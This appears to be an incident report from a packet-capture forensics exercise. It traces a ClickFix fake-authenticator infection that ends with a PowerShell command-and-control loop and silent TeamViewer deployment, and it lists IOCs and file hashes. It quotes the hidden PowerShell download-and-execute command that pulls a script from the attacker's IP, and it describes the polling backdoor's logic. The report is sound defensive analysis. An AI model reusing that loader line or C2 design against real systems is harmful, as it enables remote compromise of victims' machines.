# Incident Report: PCAP Forensic Analysis — 2025-01-22-traffic-analysis-exercise.pcap

## Evidence reviewed
Only the packet capture was present in the evidence directory (no IDS/Suricata alert export was provided). All findings below come directly from tshark analysis of the pcap.

## Victim host

| Attribute | Value |
|---|---|
| IPv4 address | **10.1.17.215** |
| MAC address | **00:d0:b7:26:4a:74** (confirmed via ARP) |
| Windows hostname | **DESKTOP-L8C5GSJ** (confirmed via DHCP option 12 and NetBIOS name registration) |
| AD domain | BLUEMOONTUESDAY (domain controller: WIN-GSH54QLW48D.bluemoontuesday.com) |
| Logged-in Windows user | **shutchenson** (confirmed via Kerberos `CNameString` from 10.1.17.215) |

## Malware family and attribution

**Behavioral attribution only — no signature confirmation available** (no IDS/Suricata export was in the evidence set).

This is a **ClickFix-style fake-verification infection chain** that ends in an attacker-deployed remote-access implant:

1. **t=38.3s** — victim's browser connects (TLS SNI) to `google-authenticator.burleson-appliance.net`, a fake Google Authenticator lure page fronted by Cloudflare (104.21.64.1).
2. **t=39.5s** — connects to `authenticatoor.org` (82.221.136.26) — the ClickFix "verification" backend that hands the victim a clipboard payload to paste and run.
3. **t=52.7s** — connects to `appointedtimeagriculture.com` (217.70.186.109) — secondary staging host in the same chain.
4. **t=60.3s** — victim's host fetches `http://5.252.153.241/api/file/get-file/264872`, a `.sct`-style component whose VBScript launches a decoy tab (`https://azure.microsoft.com`) and, hidden, spawns:
   `powershell -NoProfile -WindowStyle Hidden -Command "iex (new-object System.Net.WebClient).DownloadString('http://5.252.153.241:80/api/file/get-file/29842.ps1')"`
5. **t=62.1s** — `29842.ps1` is downloaded and IEX'd. Decoded, it computes the C: drive volume serial number, converts it to a decimal "bot ID," and enters an infinite loop: `DownloadString` from `http://5.252.153.241/<serial>` and `Invoke-Expression` whatever is returned, sleeping 5 seconds between polls. This is a fileless PowerShell command-and-control loop keyed to a per-host bot ID (observed bot ID: `1517096937`).
6. **t≈125-129s** — the C2 pushes commands that pull down a **portable/silent TeamViewer package** (`TeamViewer`, `Teamviewer_Resource_fr`, `TV`) plus a second copy of the polling script (`pas.ps1`), giving the attacker interactive hands-on-keyboard access to the host.
7. Beacon logging confirms attacker-side status tracking: `message = startup shortcut created; status = success` and `script: RunRH, status: OK, message: PS process started` — i.e. persistence was installed and the PowerShell RAT loop was running before/after reboot.
8. **t=889.6s onward** — a separate, sustained TLS channel opens to **45.125.66.32:2917** using a self-signed certificate whose CN is literally `45.125.66.32: Self-signed certificate` (auto-generated cert pattern typical of commodity RAT server code, connected to directly by IP with no DNS lookup). This carries ~10 MB over ~29 minutes — consistent with an interactive remote-access/RAT session established after the implant deployed.

Given the combination — ClickFix fake-CAPTCHA/authenticator lure, hidden PowerShell loader, disk-serial-keyed C2 polling loop, and silent deployment of TeamViewer for remote control plus a separate self-signed-cert RAT channel — this is best described as a **ClickFix-delivered PowerShell backdoor/RAT loader that installs an unauthorized remote-access tool (TeamViewer) for attacker hands-on access**. No IDS alert or public signature was available to confirm a specific named commodity family, so this label is behavioral, not signature-confirmed.

## Indicators of Compromise (all grounded in the capture)

### Malicious domains (TLS SNI observed from victim)
- `google-authenticator.burleson-appliance.net` (resolves via 104.21.64.1, Cloudflare-fronted) — fake Authenticator lure page
- `authenticatoor.org` (82.221.136.26) — ClickFix backend
- `appointedtimeagriculture.com` (217.70.186.109) — staging host

### Command-and-control endpoints (IP:port)
- **5.252.153.241:80** — HTTP payload host and command-polling C2 (primary loader/backdoor C2)
- **45.125.66.32:2917** — TLS C2 with self-signed certificate (CN `45.125.66.32: Self-signed certificate`), sustained ~10 MB / ~29 min session — RAT/interactive-access channel
- **45.125.66.252:443** — secondary TLS connection to the same /29-adjacent block, no SNI, direct-to-IP (related infrastructure, lower confidence than the two above)

### Malicious URLs
- `http://5.252.153.241/api/file/get-file/264872` — VBScript component/dropper
- `http://5.252.153.241/api/file/get-file/29842.ps1` and `http://5.252.153.241/api/file/get-file/pas.ps1` — PowerShell C2 polling loop (identical content, two filenames)
- `http://5.252.153.241/api/file/get-file/TeamViewer`, `.../Teamviewer_Resource_fr`, `.../TV` — remote-access tool payloads
- `http://5.252.153.241/<bot-id>` (observed bot ID `1517096937`) — repeating C2 beacon/poll, e.g. `http://5.252.153.241/1517096937?k=message%20=%20startup%20shortcut%20created;%20%20status%20=%20success;` and `...?k=script:%20RunRH,%20status:%20OK,%20message:%20PS%20process%20started`

### Transferred files and SHA256 hashes
| File | SHA256 | Notes |
|---|---|---|
| 264872 | c74123dbccded43fda61651e102750b041d4c3af6fda88cd6436f9276653e103 | VBScript/.sct dropper, launches hidden PowerShell |
| 29842.ps1 / pas.ps1 | b8ce40900788ea26b9e4c9af7efab533e8d39ed1370da09b93fcf72a16750ded / a833f27c2bb4cad31344e70386c44b5c221f031d7cd2f2a6b8601919e790161e | Identical decoded content: serial-number-keyed C2 polling loop |
| TeamViewer | 904280f20d697d876ab90a1b74c0f22a83b859e8b0519cb411fda26f1642f53e | PE32 GUI executable — attacker-deployed remote access tool |
| Teamviewer_Resource_fr | 9634ecaf469149379bba80a745f53d823948c41ce4e347860701cbdff6935192 | PE32 DLL — TeamViewer resource module |
| TV | 3448da03808f24568e6181011f8521c0713ea6160efd05bff20c43b091ff59f7 | PE32 DLL (stripped) — TeamViewer support component |

### Benign context (not indicators, listed for completeness)
- `master16.teamviewer.com` (185.188.32.26) — legitimate TeamViewer DynGate check-in traffic generated by the attacker-installed client, not itself malicious infrastructure.
- All Microsoft/Windows Update, MSN, Bing, LinkedIn ad, and NTP traffic to `*.microsoft.com`, `windowsupdate.com`, `msn.com`, etc. — normal OS/background telemetry, unrelated to the incident.
